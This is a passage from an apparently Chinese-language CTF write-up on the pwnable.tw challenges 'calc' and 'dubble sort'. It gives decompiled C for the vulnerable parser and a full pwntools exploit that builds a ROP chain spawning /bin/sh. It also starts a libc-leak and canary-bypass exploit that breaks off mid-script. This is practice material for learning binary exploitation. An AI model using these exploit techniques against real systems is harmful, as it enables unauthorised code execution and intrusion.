[ebp-84h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-80h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-78h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-74h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-70h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+9Ch] [ebp-Ch]</span>  v11 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  buf_s_ <span class="token operator">=</span> buf_s<span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">bzero</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> buf_s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">9</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断是不是操作符</span>    <span class="token punctuation">{</span>      v2 <span class="token operator">=</span> i <span class="token operator">+</span> buf_s <span class="token operator">-</span> buf_s_<span class="token punctuation">;</span>      s1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memcpy</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> buf_s_<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>      s1<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//表达式开头不为0</span>      <span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"prevent division by zero"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      v9 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//字符串转数字</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>new_buf<span class="token punctuation">)</span><span class="token operator">++</span><span class="token punctuation">;</span>        new_buf<span class="token punctuation">[</span>v4 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> buf_s<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> buf_s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">9</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断运算符是否合法</span>      <span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"expression error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      buf_s_ <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> buf_s<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> s<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//从这里就可以看出s数组用来存储运算符</span>      <span class="token punctuation">{</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> buf_s<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">case</span> <span class="token string">'%'</span><span class="token punctuation">:</span>          <span class="token keyword">case</span> <span class="token string">'*'</span><span class="token punctuation">:</span>          <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> s<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'+'</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'-'</span> <span class="token punctuation">)</span>            <span class="token punctuation">{</span>              <span class="token function">eval</span><span class="token punctuation">(</span>new_buf<span class="token punctuation">,</span> s<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              s<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> buf_s<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>              s<span class="token punctuation">[</span><span class="token operator">++</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> buf_s<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">case</span> <span class="token string">'+'</span><span class="token punctuation">:</span>          <span class="token keyword">case</span> <span class="token string">'-'</span><span class="token punctuation">:</span>            <span class="token function">eval</span><span class="token punctuation">(</span>new_buf<span class="token punctuation">,</span> s<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            s<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> buf_s<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token function">eval</span><span class="token punctuation">(</span>new_buf<span class="token punctuation">,</span> s<span class="token punctuation">[</span>v7<span class="token operator">--</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        s<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> buf_s<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> buf_s<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v7 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token function">eval</span><span class="token punctuation">(</span>new_buf<span class="token punctuation">,</span> s<span class="token punctuation">[</span>v7<span class="token operator">--</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>但是真正的漏洞在于eval计算函数。</p><pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span>__cdecl <span class="token function">eval</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>new_buf<span class="token punctuation">,</span> <span class="token keyword">char</span> op<span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> op <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    new_buf<span class="token punctuation">[</span><span class="token operator">*</span>new_buf <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> new_buf<span class="token punctuation">[</span><span class="token operator">*</span>new_buf<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> op <span class="token operator">></span> <span class="token string">'+'</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> op <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      new_buf<span class="token punctuation">[</span><span class="token operator">*</span>new_buf <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">=</span> new_buf<span class="token punctuation">[</span><span class="token operator">*</span>new_buf<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> op <span class="token operator">==</span> <span class="token string">'/'</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      new_buf<span class="token punctuation">[</span><span class="token operator">*</span>new_buf <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span><span class="token operator">=</span> new_buf<span class="token punctuation">[</span><span class="token operator">*</span>new_buf<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> op <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    new_buf<span class="token punctuation">[</span><span class="token operator">*</span>new_buf <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span><span class="token operator">=</span> new_buf<span class="token punctuation">[</span><span class="token operator">*</span>new_buf<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  result <span class="token operator">=</span> new_buf<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token operator">*</span>new_buf<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>那么如果我们一开始就是输入类似于+1314+1这类的表达式，我们可以发现init_pool函数开辟的空间里是这样的。<br><img src="/2020/01/30/pwnablele-exercises/6.png" title="This is an image"></p><p>我们可以看到最开始的数组索引部分被修改为第一次运算结果v1，那么接下来的运算就是new_buf[<em>new_buf - 1] + new_buf[1] ===&gt; new_buf[</em>new_buf - 1],这就会造成任意地址的读写。</p><p>那么我们在调试的时候很容易知道返回地址ret和我们的输入相关内存单元的地址差<br><img src="/2020/01/30/pwnablele-exercises/7.png" title="This is an image"></p><p>eax中就是索引也就是我们漏洞利用后的计算结果，所以很就实现了。</p><p>exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>local <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./calc'</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./calc'</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">else</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"chall.pwnable.tw"</span><span class="token punctuation">,</span><span class="token number">10100</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./calc'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> elf<span class="token punctuation">.</span>archcontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">sd</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sl</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ru</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    sl<span class="token punctuation">(</span><span class="token string">"+"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#先泄露出栈里面本来存储的内容</span>    data <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> int<span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data <span class="token operator">></span> y <span class="token punctuation">:</span>        temp <span class="token operator">=</span> data <span class="token operator">-</span> y        payload <span class="token operator">=</span> <span class="token string">"+"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"-"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>        sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        rc<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> y <span class="token operator">-</span> data        payload <span class="token operator">=</span> <span class="token string">"+"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"+"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>        sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        rc<span class="token punctuation">(</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080701aa</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080ec060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0805c34b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">'/bin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0809b30d</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080701aa</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080ec064</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 4</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0805c34b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">'//sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0809b30d</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080701aa</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080ec068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080550d0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0809b30d</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080481d1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ebx ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080ec060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080701d1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ecx ; pop ebx ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080ec068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080ec060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding without overwrite ebx</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080701aa</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080ec068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x080550d0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0807cb7f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0807cb7f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0807cb7f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0807cb7f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0807cb7f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0807cb7f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0807cb7f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0807cb7f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0807cb7f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0807cb7f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0807cb7f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x08049a21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># int 0x80</span>rc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    calc<span class="token punctuation">(</span><span class="token number">361</span><span class="token operator">+</span>i<span class="token punctuation">,</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>参考链接：</p><blockquote><p><a href="https://v1ckydxp.github.io/2019/04/25/pwnable-tw-calc-writeup/" target="_blank" rel="noopener">https://v1ckydxp.github.io/2019/04/25/pwnable-tw-calc-writeup/</a><br><a href="https://zszcr.github.io/2018/10/07/2018-10-7-pwnable.tw-writeup/" target="_blank" rel="noopener">https://zszcr.github.io/2018/10/07/2018-10-7-pwnable.tw-writeup/</a></p></blockquote><h1 id="dubble-sort"><a href="#dubble-sort" class="headerlink" title="dubble sort"></a>dubble sort</h1><p>pwnable上的第5个题目，下面进行分析：<br>main函数：<br><img src="/2020/01/30/pwnablele-exercises/8.png" title="This is an image"></p><p>里面在第一次读入name的时候由于read函数读入不会自动添加\x00,所以我们可以泄露出基地址，同时在输入的时候由于输入量是自己设顶的，所以会造成栈溢出，虽然开了canary，但是scanf函数有个经典漏洞。</p><h3 id="scanf漏洞"><a href="#scanf漏洞" class="headerlink" title="scanf漏洞"></a>scanf漏洞</h3><p>scanf函数当输入”+”和”-“的时候不会改变栈里面的内容，那么我们通过调试就可以得出栈空间改如何排布，（不知道为啥我的远程连不上就本地打喽）</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher<span class="token comment" spellcheck="true">#context.log_level = "debug"</span>local <span class="token operator">=</span> <span class="token number">1</span>exec_binary <span class="token operator">=</span> <span class="token string">'./dubblesort'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exec_binaryelf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exec_binary<span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>exec_binary<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"chall.pwnable.tw"</span><span class="token punctuation">,</span><span class="token number">10101</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc<span class="token punctuation">,</span>libcbase    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span>    libcbase <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">confirm</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> globals<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> n<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">==</span> address<span class="token punctuation">:</span>            <span class="token keyword">return</span> success<span class="token punctuation">(</span>key<span class="token operator">+</span><span class="token string">" ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    break_point <span class="token operator">=</span> <span class="token string">'b *'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\nc'</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">,</span>break_point<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What your name :"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">27</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>__libc_start_main_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\xf7"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x197d04</span>get_libc<span class="token punctuation">(</span>__libc_start_main_addr<span class="token punctuation">,</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>confirm<span class="token 